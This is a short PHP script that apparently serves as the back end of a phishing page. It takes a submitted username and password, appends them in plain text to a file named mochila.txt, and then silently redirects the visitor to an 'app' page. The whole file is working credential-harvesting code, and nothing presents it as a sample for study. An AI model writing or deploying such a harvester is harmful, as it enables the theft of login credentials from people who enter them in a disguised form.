<?php

$n1 = $_POST["user"];
$n2 = $_POST["pass"];

$conteudo = "$n1;$n2\n";


$arquivo = "mochila.txt";


if (!$abrir = fopen($arquivo, "a")) { echo "Erro abrindo arquivo 


($arquivo)"; exit; }



if (!fwrite($abrir, $conteudo)) { print "Erro escrevendo no arquivo 
($arquivo)"; exit; } 

echo '<meta http-equiv="refresh" content="0;url=app">';



fclose($abrir);

?>
